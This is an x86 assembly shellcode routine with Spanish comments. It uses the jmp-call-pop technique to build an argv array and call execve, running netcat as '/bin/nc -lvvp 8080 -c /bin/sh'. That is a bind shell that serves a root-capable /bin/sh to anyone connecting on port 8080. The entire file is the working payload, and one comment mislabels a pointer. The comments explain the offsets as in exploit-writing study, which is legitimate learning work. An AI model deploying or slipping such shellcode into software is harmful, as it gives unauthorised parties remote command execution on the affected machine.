; netcat [v1.10-41.1] (Parrot, Kali) 
section .text
global _start
_start:
        jmp dir_cadena
codigo:
        pop esi
        mov byte[esi+7],0  ; '/bin/nc\0-lvvp 8080N-c /bin/shNXXXXYYYYZZZZMMMM'
        mov byte[esi+18],0  ; '/bin/nc\0-lvvp 8080\0-c /bin/shNXXXXYYYYZZZZMMMM'
        mov byte[esi+29],0  ; '/bin/nc\0-lvvp 8080\0-c /bin/sh\0XXXXYYYYZZZZMMMM'
        
        mov dword[esi+30], esi  ; empieza XXXX -> direccion de cadena /bin/sh
        lea ebx,[esi+8]  ; EBX tiene la dir de la cadena
        mov dword[esi+34],ebx  ; empieza YYYY  -> direccion de cadena -lvvp 8080
        lea ebx,[esi+19]  ; empieza-c /bin/sh
        mov dword[esi+38],ebx  ; empieza ZZZZ  -> dirección de cadena -c /bin/sh
        mov dword[esi+42],0  ; empieza MMMM  -> NULL
        mov ebx,esi

        lea ecx, [esi+30]  ; ECX tiene la dir <dir_cad>  empieza XXXX
        lea edx, [esi+42]  ; EDX tiene la dir donde está el valor 0000  empieza MMMM

        mov eax,11  ; asigna a EAX valor de execve
        int 0x80
dir_cadena:
        call codigo
        db '/bin/ncN-lvvp 8080N-c /bin/shNXXXXYYYYZZZZMMMM'
        ; /bin/nc -lvvp 8080 -c /bin/sh
        ; /bin/ncN-lvvp 8080N-c /bin/shNXXXXYYYYZZZZMMMM
        